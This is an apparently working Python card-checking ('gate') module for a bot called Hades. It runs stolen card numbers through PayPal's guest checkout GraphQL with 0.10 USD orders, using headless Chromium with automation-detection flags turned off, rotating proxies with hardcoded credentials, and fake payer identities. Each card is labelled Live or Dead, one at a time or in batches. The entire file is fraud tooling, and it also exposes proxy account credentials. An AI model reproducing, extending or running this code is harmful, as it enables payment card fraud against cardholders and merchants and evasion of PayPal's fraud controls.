#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PayPal Gate Optimizado para Hades V1 - FIX 2026-09-13 Playwright + Proxies Rotativos
- Verificado con Playwright: endpoints smart/buttons, card-fields, graphql activos
- Cloudscraper causaba timeout en graphql (read timeout 30s) -> todas las respuestas parecian rate-limit/timeout
- Fix: usar Playwright browser fetch (real Chromium) que si completa graphql en ~1.5s
- Proxies: 4x HTTP rotativos (iqgbcwxy) activos siempre, auto-retry si proxy cae, args --disable-dev-shm-usage
- Soporta 2captcha, Capsolver, Anticaptcha (según CAPTCHA_PROVIDER)
- Adaptado para Hades: gate_check / gate_check_multiple con semáforos (global 5 limit OOM)
"""
import asyncio
import re
import random
import json
import os
import logging
from faker import Faker
from collections import defaultdict

# Cargar env
from dotenv import load_dotenv
load_dotenv()

# aiohttp no usado tras migrar a Playwright - se mantiene solo por compatibilidad si se re-activa fallback
try:
    import aiohttp  # noqa: F401
    from aiohttp import ClientTimeout  # noqa: F401
except ImportError:
    aiohttp = None
    ClientTimeout = None
try:
    import cloudscraper
except ImportError:
    cloudscraper = None
try:
    from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
except ImportError:
    async_playwright = None
    PlaywrightTimeoutError = asyncio.TimeoutError

# Configuración de proxies y captcha desde .env
DATAIMPULSE_PROXY = os.getenv("DATAIMPULSE_PROXY", "").strip()
DECODO_PROXY = os.getenv("DECODO_PROXY", "").strip()
PROXY_STRING = os.getenv("PROXY_STRING", "").strip()
USE_PROXY = os.getenv("USE_PROXY", "true").lower() == "true"

ANTICAPTCHA_API_KEY = os.getenv("ANTICAPTCHA_API_KEY", "").strip()
CAPSOLVER_API_KEY = os.getenv("CAPSOLVER_API_KEY", "").strip()
TWO_CAPTCHA_API_KEY = os.getenv("TWO_CAPTCHA_API_KEY", "").strip()
CAPTCHA_PROVIDER = os.getenv("CAPTCHA_PROVIDER", "").strip().lower()

logger = logging.getLogger(__name__)

# Semáforos para Hades
# FIX 2026-09-13: global 15 -> 5 para Playwright (cada Chromium ~150MB; 15 = >2GB OOM en VPS 4GB)
# user 3 se mantiene (Hades single-user antispam)
global_semaphore = asyncio.Semaphore(5)
user_semaphore = asyncio.Semaphore(3)
user_request_count = defaultdict(int)
active_requests_count = 0
# global fake removido - se usa Faker local por request (thread-safe); este global era dead code

PAYPAL_USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0',
]
def get_random_paypal_ua():
    return random.choice(PAYPAL_USER_AGENTS)
# get_paypal_fingerprint muerto tras migrar a Playwright (headers reales del browser)
# se mantiene comentado por si se re-activa cloudscraper fallback:
# def get_paypal_fingerprint(ua=None): ...
def get_paypal_fingerprint(ua=None):
    if not ua:
        ua = get_random_paypal_ua()
    m = re.search(r'Chrome/(\d+)\.', ua)
    chrome_ver = m.group(1) if m else '126'
    is_mobile = 'Mobile' in ua or 'iPhone' in ua
    platform = '"Windows"' if 'Windows' in ua else ('"macOS"' if 'Macintosh' in ua else '"Linux"')
    alangs = ['es-MX,es;q=0.7', 'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'es-MX,es;q=0.9,en;q=0.8']
    return {
        'User-Agent': ua,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(alangs),
        'Sec-Ch-Ua': f'"Not/A)Brand";v="8", "Chromium";v="{chrome_ver}", "Google Chrome";v="{chrome_ver}"',
        'Sec-Ch-Ua-Mobile': '?1' if is_mobile else '?0',
        'Sec-Ch-Ua-Platform': platform,
        'Sec-Gpc': '1',
        'Upgrade-Insecure-Requests': '1',
    }

PAYPAL_CLIENT_ID = "AXGz3gL7tUsVopYLol7Js1cInn3msFCBjNlxwQEvk5pFGGOksCRTCgXqlsZi1mt69QNnrXhDSvdQw86P"
PAYPAL_BUTTON_URL = (
    "https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect"
    "&style.tagline=false&style.menuPlacement=below&style.shouldApplyRebrandedStyles=false"
    "&style.isButtonColorABTestMerchant=false&style.isPayNowOrLaterLabelEligible=false"
    "&style.shouldApplyPayNowOrLaterLabel=false&style.requestedButtonColor=gold&style.brandVersion=v1"
    "&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_43ff635940_mdy6nte6mza"
    "&buttonSize=medium&customerId=&clientID=" + PAYPAL_CLIENT_ID +
    "&clientMetadataID=uid_0c5caea5ce_mdy6mzi6mjg&commit=true&components.0=buttons&currency=MXN"
    "&debug=false&disableSetCookie=true&eagerOrderCreation=false&env=production"
)

# === PROXY POOL ACTIVO - rotación siempre ===
# Formato usuario te pasó: https://iqgbcwxy:v2krgc0qmmv5:IP:PORT  (con : en vez de @) -> normalizado a http://user:pass@IP:PORT
_RAW_PROXIES = [
    "https://iqgbcwxy:v2krgc0qmmv5:45.39.115.193:5604",
    "https://iqgbcwxy:v2krgc0qmmv5:107.181.142.44:5637",
    "https://iqgbcwxy:v2krgc0qmmv5:192.210.191.139:6125",
    "https://iqgbcwxy:v2krgc0qmmv5:23.236.196.141:6231",
]
def _normalize_proxy(raw: str) -> str:
    """Convierte https://user:pass:IP:PORT o https://user:pass@IP:PORT -> http://user:pass@IP:PORT"""
    raw = raw.strip()
    if not raw:
        return raw
    # quitar scheme
    scheme = "http://"
    if "://" in raw:
        scheme_part, rest = raw.split("://", 1)
        # si scheme es https, mantenemos http para proxy server (playwright compatible)
        scheme = "http://"
    else:
        rest = raw
    # rest puede ser user:pass:IP:PORT  o user:pass@IP:PORT
    if "@" in rest:
        # ya está bien: user:pass@IP:PORT
        return scheme + rest
    # sin @: user:pass:IP:PORT -> separar por :
    parts = rest.split(":")
    if len(parts) == 4:
        user, pwd, ip, port = parts
        return f"{scheme}{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 3:
        # caso raro user:pass@IP:PORT ya manejado, pero si llega user:IP:PORT
        return scheme + rest
    return scheme + rest

PROXY_LIST = [_normalize_proxy(p) for p in _RAW_PROXIES]

def get_proxy_url():
    """Obtiene proxy rotativo - siempre activo ahora"""
    if not PROXY_LIST:
        return None
    # rotación aleatoria por request para distribuir carga y evitar rate-limit por IP
    return random.choice(PROXY_LIST)

def get_cloudscraper_session(proxy_url=None):
    if cloudscraper is None:
        return None
    try:
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
            delay=2,
        )
        if proxy_url:
            scraper.proxies = {'http': proxy_url, 'https': proxy_url}
        return scraper
    except Exception:
        return None

def _proxy_dict(proxy_url):
    if not proxy_url:
        return None
    return {'http': proxy_url, 'https': proxy_url}

def _parse_proxy_for_playwright(proxy_url):
    if not proxy_url:
        return None
    try:
        from urllib.parse import urlparse
        # asegurar formato normalizado
        proxy_url = _normalize_proxy(proxy_url)
        parsed = urlparse(proxy_url)
        # playwright necesita server con scheme http://
        server = f"http://{parsed.hostname}:{parsed.port}"
        cfg = {"server": server}
        if parsed.username:
            cfg["username"] = parsed.username
        if parsed.password:
            cfg["password"] = parsed.password
        return cfg
    except Exception as e:
        logger.warning(f"Proxy parse fallo {proxy_url}: {e}")
        return None

def get_bin_info(cc):
    bin_number = cc[:6]
    try:
        import sqlite3
        db_path = os.path.join(os.path.dirname(__file__), "tarjetas.db")
        if os.path.exists(db_path):
            con = sqlite3.connect(db_path)
            try:
                cur = con.cursor()
                cur.execute("SELECT bin, brand, tipo, nivel, Banco, pa_s FROM tarjetas WHERE bin=? LIMIT 1", (int(bin_number),))
                row = cur.fetchone()
                if row:
                    return {"brand": row[1], "type": row[2], "level": row[3], "bank": row[4], "country": row[5], "bin": bin_number}
            finally:
                con.close()
    except Exception:
        pass
    try:
        import requests
        req = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5).json()
        return {
            "brand": req.get("brand", "N/A"),
            "country": req.get("country_name", "N/A"),
            "type": req.get("type", "N/A"),
            "level": req.get("level", "N/A"),
            "bin": bin_number,
            "bank": req.get("bank") or "N/A"
        }
    except Exception:
        return {"brand": "N/A", "country": "N/A", "type": "N/A", "level": "N/A", "bin": bin_number, "bank": "N/A"}

def card_parse(card_input):
    parts = [p.strip() for p in re.split(r'\s*[|/:]\s*|\s+', card_input.strip()) if p.strip()]
    if len(parts) > 4:
        cc = ''.join(parts[:len(parts)-3])
        month, year, cvv = parts[-3], parts[-2], parts[-1]
    elif len(parts) == 4:
        cc, month, year, cvv = parts
    else:
        raise ValueError(f"Se esperaban 4 campos CC|MM|YY|CVV, se recibieron {len(parts)}")
    if not cc.isdigit() or not (13 <= len(cc) <= 19):
        raise ValueError(f"CC inválida longitud {len(cc)}")
    if not month.isdigit() or not (1 <= int(month) <= 12):
        raise ValueError(f"Mes inválido {month}")
    month = month.zfill(2)
    if not year.isdigit() or len(year) not in (2, 4):
        raise ValueError(f"Año inválido {year}")
    year = f"20{year}" if len(year) == 2 else year
    try:
        from datetime import datetime as _dt
        now_y = _dt.now().year
        if int(year) < now_y or int(year) > now_y + 15:
            pass
    except:
        pass
    if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
        raise ValueError(f"CVV inválido {cvv}")
    if cc[0] == "3" and len(cc) != 15:
        pass
    if cc[0] == "3" and len(cvv) != 4:
        pass
    if cc[0] in ("4","5","6") and len(cvv) != 3:
        pass
    cctype = {"4": "Visa", "5": "MasterCard", "3": "American Express", "6": "Discover"}.get(cc[0], "Unknown")
    return cc, month, year, cvv, cctype

async def solve_captcha_if_needed(session, proxy=None):
    return None

async def _playwright_charge(cc, month, year, cvv, cctype, email, nombre_completo, first_name, last_name, postal, phone, _ua, proxy_url, timeout):
    """Ejecuta el flujo PayPal via Playwright browser fetch - retorna (facilitator, order_id, itok, json, text)"""
    if async_playwright is None:
        raise Exception("Playwright no instalado - instala con pip install playwright && playwright install chromium")
    step_timeout = min(20000, max(10000, (timeout * 1000) // 2))
    proxy_cfg = _parse_proxy_for_playwright(proxy_url)
    async with async_playwright() as p:
        # FIX OOM/shared-mem en VPS: --disable-dev-shm-usage usa /tmp en vez de /dev/shm (64MB)
        browser = await p.chromium.launch(headless=True, args=['--no-sandbox','--disable-blink-features=AutomationControlled','--disable-dev-shm-usage','--disable-gpu','--no-first-run','--no-zygote'])
        try:
            context_kwargs = {
                "user_agent": _ua,
                "locale": "es-MX",
            }
            if proxy_cfg:
                context_kwargs["proxy"] = proxy_cfg
            context = await browser.new_context(**context_kwargs)
            page = await context.new_page()
            # 1. Buttons -> facilitatorAccessToken
            resp = await page.goto(PAYPAL_BUTTON_URL, wait_until='domcontentloaded', timeout=step_timeout)
            if resp is None or resp.status != 200:
                status = resp.status if resp else 0
                raise Exception(f"Buttons {status}")
            html = await page.content()
            m = re.search(r'"facilitatorAccessToken"\s*:\s*"([^"]+)"', html)
            if not m:
                start = html.find('"facilitatorAccessToken":"')
                if start == -1:
                    # check rate limit in html
                    if "RATE_LIMIT" in html or "Too many requests" in html:
                        raise Exception("Rate limit PayPal - buttons")
                    raise Exception("No facilitatorAccessToken")
                start += len('"facilitatorAccessToken":"')
                end = html.find('"', start)
                facilitator_token = html[start:end]
            else:
                facilitator_token = m.group(1)
            if not facilitator_token or len(facilitator_token) < 20:
                raise Exception("Token vacío")

            # 2. Crear orden 0.10 USD via browser fetch (usa email/nombre generados para fingerprint)
            order_result = await page.evaluate("""async (args) => {
                const {tok, email, name} = args;
                const res = await fetch('https://www.paypal.com/v2/checkout/orders', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${tok}`,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'Origin': 'https://www.paypal.com',
                        'Referer': 'https://www.paypal.com/',
                        'X-App-Name': 'hermione'
                    },
                    body: JSON.stringify({
                        intent: "CAPTURE",
                        purchase_units: [{ description: "Payment for Donate", amount: { value: "0.10", currency_code: "USD" } }],
                        payer: { email_address: email, name: { name: name }, address: { address_line_1: null, address_line_2: null, postal_code: null, country_code: "MX" } },
                        application_context: { shipping_preference: "NO_SHIPPING" }
                    })
                });
                const text = await res.text();
                return {status: res.status, text: text};
            }""", {"tok": facilitator_token, "email": email, "name": nombre_completo})
            if order_result["status"] not in (200, 201):
                txt = order_result["text"]
                if "RATE_LIMIT" in txt or order_result["status"] == 429:
                    raise Exception("Rate limit PayPal")
                raise Exception(f"Orden {order_result['status']}")
            try:
                order_json = json.loads(order_result["text"])
            except Exception:
                raise Exception(f"Orden JSON invalido {order_result['status']}")
            order_id = order_json.get('id')
            if not order_id:
                raise Exception("No order_id")

            # 3. card-fields -> integrityToken
            url_cardfields = (
                f'https://www.paypal.com/smart/card-fields?token={order_id}'
                '&sessionID=uid_0c5caea5ce_mdy6mzi6mjg&buttonSessionID=uid_43ff635940_mdy6nte6mza'
                '&locale.x=es_MX&commit=true&style.submitButton.display=true&hasShippingCallback=false'
                '&env=production&country.x=MX&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhHejNnTDd0VXNWb3BZTG9sN0pzMWNJbm4zbXNGQ0JqTmx4d1FFdms1cEZHR09rc0NSVENnWHFsc1ppMW10NjlRTm5yWGhEU3ZkUXc4NlAmY3VycmVuY3k9TVhOIiwiYXR0cnMiOnsiZGF0YS11aWQiOiJ1aWRfaXlyZnFrcmRqcnJma211aXNlamxqZnJkY2NscHpmIn19&disable-card='
            )
            resp3 = await page.goto(url_cardfields, wait_until='domcontentloaded', timeout=step_timeout)
            if resp3 is None or resp3.status != 200:
                raise Exception(f"card-fields {resp3.status if resp3 else 0}")
            html3 = await page.content()
            m3 = re.search(r'"integrityToken"\s*:\s*"([^"]+)"', html3)
            if not m3:
                start = html3.find('"integrityToken":"')
                if start == -1:
                    if "RATE_LIMIT" in html3 or "Too many requests" in html3:
                        raise Exception("Rate limit PayPal - card-fields")
                    raise Exception("No integrityToken")
                start += len('"integrityToken":"')
                end = html3.find('"', start)
                integrity_token = html3[start:end]
            else:
                integrity_token = m3.group(1)

            # 4. payWithCard GraphQL via browser fetch
            card_type_map = {'4': 'VISA', '5': 'MASTER_CARD', '3': 'AMEX', '6': 'DISCOVER'}
            # PayPal GraphQL expects AMEX not AMERICAN_EXPRESS (verified: AMERICAN_EXPRESS -> Variable invalid)
            card_type = card_type_map.get(cc[0], 'MASTER_CARD')
            # Fallback: si AMEX falla, reintentar con AMERICAN_EXPRESS? pero por ahora AMEX es correcto
            gql_result = await page.evaluate("""async (args) => {
                const {tok, orderId, itok, cc, ctype, month, year, postal, cvv, phone, first, last, email} = args;
                const res = await fetch('https://www.paypal.com/graphql?paywithcard', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${tok}`,
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'Origin': 'https://www.paypal.com',
                        'Referer': 'https://www.paypal.com/smart/card-fields',
                        'X-App-Name': 'hermione'
                    },
                    body: JSON.stringify({
                        query: `mutation payWithCard($token: String!, $card: CardInput, $paymentToken: String, $phoneNumber: String, $firstName: String, $lastName: String, $shippingAddress: AddressInput, $billingAddress: AddressInput, $email: String, $currencyConversionType: CheckoutCurrencyConversionType, $installmentTerm: Int, $identityDocument: IdentityDocumentInput, $feeReferenceId: String, $integrityToken: String) { approveGuestPaymentWithCreditCard(token: $token, card: $card, paymentToken: $paymentToken, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, email: $email, shippingAddress: $shippingAddress, billingAddress: $billingAddress, currencyConversionType: $currencyConversionType, installmentTerm: $installmentTerm, identityDocument: $identityDocument, feeReferenceId: $feeReferenceId, integrityToken: $integrityToken) { flags { is3DSecureRequired } cart { intent cartId buyer { userId auth { accessToken } } returnUrl { href } } paymentContingencies { threeDomainSecure { status method redirectUrl { href } parameter } } } }`,
                        variables: {
                            token: orderId,
                            card: { cardNumber: cc, type: ctype, expirationDate: `${month}/${year}`, postalCode: postal, securityCode: cvv },
                            phoneNumber: phone,
                            firstName: first,
                            lastName: last,
                            billingAddress: { givenName: first, familyName: last, line1: null, line2: null, city: null, state: null, postalCode: postal, country: "MX" },
                            email: email,
                            currencyConversionType: "PAYPAL",
                            integrityToken: itok
                        },
                        operationName: "payWithCard"
                    })
                });
                const text = await res.text();
                return {status: res.status, text: text};
            }""", {"tok": facilitator_token, "orderId": order_id, "itok": integrity_token, "cc": cc, "ctype": card_type, "month": month, "year": year, "postal": postal, "cvv": cvv, "phone": phone, "first": first_name, "last": last_name, "email": email})

            if gql_result["status"] == 429 or "RATE_LIMIT" in gql_result["text"] or "Too many requests" in gql_result["text"]:
                raise Exception("Rate limit PayPal - graphql 429")
            try:
                result_json = json.loads(gql_result["text"])
            except Exception:
                raise Exception(f"PayPal graphql invalid JSON {gql_result['status']}")
            text_response = json.dumps(result_json)
            if isinstance(result_json, dict) and result_json.get("name") == "RATE_LIMIT_REACHED":
                raise Exception("Rate limit PayPal - RATE_LIMIT_REACHED")
            if "RATE_LIMIT" in text_response or "Too many requests" in text_response:
                raise Exception("Rate limit PayPal")
            return facilitator_token, order_id, integrity_token, result_json, text_response
        finally:
            try:
                await browser.close()
            except:
                pass

async def paypal_charge(card, proxy_url=None, timeout=35):
    """
    Procesa una tarjeta con PayPal 0.10 USD — Optimizado con Playwright
    Retorna (status, message) para compatibilidad con paypal.py original
    """
    try:
        cc, month, year, cvv, cctype = card_parse(card)
    except Exception as e:
        return "Error! 💥", f"Formato inválido: {e}"

    _fake_local = Faker("en_US")
    email = _fake_local.email()
    nombre_completo = _fake_local.name()
    first_name = nombre_completo.split()[0]
    last_name = " ".join(nombre_completo.split()[1:]) if len(nombre_completo.split()) > 1 else "Doe"
    raw_postal = _fake_local.postcode()
    postal = re.sub(r'\D', '', raw_postal)[:5].zfill(5)
    if len(postal) != 5 or postal == "00000":
        postal = ''.join(str(random.randint(1,9)) for _ in range(5))
    phone_raw = re.sub(r'\D', '', _fake_local.phone_number())
    phone = (phone_raw[:10] if len(phone_raw) >= 10 else ''.join(str(random.randint(0,9)) for _ in range(10)))
    if len(phone) < 10:
        phone = "5551234567"

    if proxy_url is None:
        proxy_url = get_proxy_url()
    
    _ua = get_random_paypal_ua()

    # Retry con rotación si proxy falla (hasta 2 intentos extra)
    last_exc = None
    proxies_tried = []
    for attempt in range(3):
        if attempt > 0:
            # elegir proxy distinto al anterior
            new_proxy = get_proxy_url()
            # evitar repetir mismo proxy
            tries = 0
            while new_proxy in proxies_tried and len(proxies_tried) < len(PROXY_LIST) and tries < 5:
                new_proxy = get_proxy_url()
                tries += 1
            proxy_url = new_proxy
        proxies_tried.append(proxy_url)
        try:
            facilitator_token, order_id, integrity_token, result_json, text_response = await asyncio.wait_for(
                _playwright_charge(cc, month, year, cvv, cctype, email, nombre_completo, first_name, last_name, postal, phone, _ua, proxy_url, timeout),
                timeout=timeout
            )
            last_exc = None
            break
        except Exception as e:
            msg_low = str(e).lower()
            # solo reintentar si es fallo de proxy/red, no si es lógica PayPal ni timeout de PayPal (graphql hang)
            # no reintentar en timeout genérico (4111 hang) para no triplicar espera
            is_proxy_err = any(x in msg_low for x in ["proxy", "tunnel", "econn", "ehost", "net::err", "socks", "err_proxy", "connection refused", "connection failed"])
            # No reintentar si es RATE_LIMIT ya clasificado o token vacío
            if "rate limit" in msg_low or "facilitatoraccesstoken" in msg_low or "integritytoken" in msg_low or "no order_id" in msg_low:
                is_proxy_err = False
            last_exc = e
            if is_proxy_err and attempt < 2:
                logger.warning(f"PayPal proxy fallo intento {attempt+1} {proxy_url.split('@')[-1] if proxy_url else 'direct'}: {e} -> retry")
                await asyncio.sleep(0.5)
                continue
            else:
                # si no es proxy o último intento, propagar
                if attempt == 2 or not is_proxy_err:
                    # si fue último intento y teníamos proxy error, lo lanzamos para que lo maneje el except general
                    if last_exc is not None:
                        raise last_exc
                continue
    try:
        if last_exc is not None:
            raise last_exc
        if "RATE_LIMIT" in text_response or "Too many requests" in text_response or "RATE_LIMIT_REACHED" in text_response:
            return "Error! 💥", "Rate limit PayPal - reintenta en 60s"
        if 'is3DSecureRequired' in text_response or 'threeDomainSecure' in text_response:
            if result_json.get("data") and result_json["data"].get("approveGuestPaymentWithCreditCard"):
                return "APPROVED ✅", "Live Success - 3DS"
            pass
        if 'INVALID_SECURITY_CODE' in text_response and 'CARD_GENERIC_ERROR' not in text_response:
            return "APPROVED ✅", "INVALID_SECURITY_CODE - Live CVN"
        if 'EXISTING_ACCOUNT_RESTRICTED' in text_response:
            return "APPROVED ✅", "Exist Account - Live"
        if 'INVALID_BILLING_ADDRESS' in text_response and 'CARD_GENERIC_ERROR' not in text_response:
            return "APPROVED ✅", "Invalid Billing - Live"
        if 'CARD_GENERIC_ERROR' in text_response:
            return "DECLINED ❌", "CARD_GENERIC_ERROR"
        if '"errors"' in text_response or result_json.get("errors"):
            try:
                err = result_json['errors'][0] if isinstance(result_json.get('errors'), list) else {}
                msg = err.get('message', 'GraphQL error')
                data_field = ""
                if isinstance(err.get('data'), list) and len(err['data']) > 0:
                    data_field = err['data'][0].get('code', '')
                full_msg = f"{msg} {data_field}".strip()
                if 'captcha' in full_msg.lower() or 'hcaptcha' in full_msg.lower():
                    return "Error! 💥", f"Captcha requerido: {full_msg[:60]}"
                if 'RATE_LIMIT' in full_msg or 'Too many' in full_msg:
                    return "Error! 💥", "Rate limit PayPal"
                return "DECLINED ❌", full_msg[:100] or msg[:100]
            except Exception:
                return "DECLINED ❌", "GraphQL error"
        if 'cartId' in text_response or 'accessToken' in text_response:
            if result_json.get("data") and result_json["data"].get("approveGuestPaymentWithCreditCard"):
                return "APPROVED ✅", "Thanks for your payment - Live"
        return "DECLINED ❌", f"Declined - {text_response[:80]}" if text_response else "Declined - empty response"
    except asyncio.CancelledError:
        return "Error! 💥", "Timeout PayPal - reintenta (cancelled)"
    except asyncio.TimeoutError:
        return "Error! 💥", "Timeout PayPal - reintenta"
    except PlaywrightTimeoutError as e:
        return "Error! 💥", f"Timeout PayPal - reintenta ({str(e)[:40]})"
    except Exception as e:
        msg = str(e)[:120]
        low = msg.lower()
        if "timeout" in low or "timed out" in low or "cancelled" in low or "canceled" in low:
            return "Error! 💥", "Timeout PayPal - reintenta"
        if "connection" in low or "connect" in low or "net::err" in low or "proxy" in low:
            return "Error! 💥", "Error conexión PayPal"
        if "rate limit" in low or "rate_limit" in low or "429" in low:
            return "Error! 💥", "Rate limit PayPal - reintenta en 60s"
        return "Error! 💥", msg

# Wrapper para Hades (igual que gates_api.py)
async def paypal_gate_check(card_data, user_id=None):
    global active_requests_count
    active_requests_count += 1
    try:
        if user_id is None:
            user_id = 0
        user_request_count[user_id] += 1
        try:
            async with global_semaphore:
                async with user_semaphore:
                    status, msg = await paypal_charge(card_data)
                    if "APPROVED" in status:
                        return {"status": "✅ Live", "message": f"{msg} - PayPal 0.10 USD"}
                    elif "DECLINED" in status:
                        return {"status": "❌ Dead", "message": msg}
                    else:
                        return {"status": "⚠️ Error", "message": msg}
        finally:
            user_request_count[user_id] -= 1
    except Exception as e:
        return {"status": "⚠️ Error", "message": str(e)[:80]}
    finally:
        active_requests_count -= 1

async def paypal_gate_check_multiple(cards_data, user_id=None, callback=None):
    if user_id is None:
        user_id = 0
    cards_data = [c.strip() for c in cards_data if c.strip()]
    results = [None] * len(cards_data)
    queue = asyncio.Queue()
    
    async def process_one(idx, card):
        try:
            await asyncio.sleep(0.1 + (idx % 5) * 0.05)
            res = await paypal_gate_check(card, user_id)
            await queue.put((idx, res))
            return res
        except Exception as e:
            err = {"status": "⚠️ Error", "message": str(e)[:80]}
            await queue.put((idx, err))
            return err
    
    tasks = [asyncio.create_task(process_one(i, c)) for i, c in enumerate(cards_data)]
    
    async def processor():
        done = 0
        while done < len(cards_data):
            try:
                idx, res = await asyncio.wait_for(queue.get(), timeout=1.0)
                results[idx] = res
                done += 1
                if callback:
                    await callback(idx, res, cards_data[idx], user_id)
            except asyncio.TimeoutError:
                pass
    
    proc = asyncio.create_task(processor())
    await asyncio.gather(*tasks, return_exceptions=True)
    await proc
    return results

async def paypal_charge_original_compat(card):
    return await paypal_charge(card)

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Uso: python paypal_optimized.py \"CC|MM|YY|CVV\"")
        sys.exit(1)
    card = sys.argv[1]
    import asyncio
    _px = get_proxy_url() or 'direct'
    # mascarar password en log
    _px_mask = _px.replace("v2krgc0qmmv5", "***") if _px else _px
    print(f"Testing {card} con proxy {_px_mask}")
    print(f"Captcha provider: {CAPTCHA_PROVIDER or 'ninguno (PayPal no requiere captcha)'}")
    res = asyncio.run(paypal_charge(card))
    print(res)
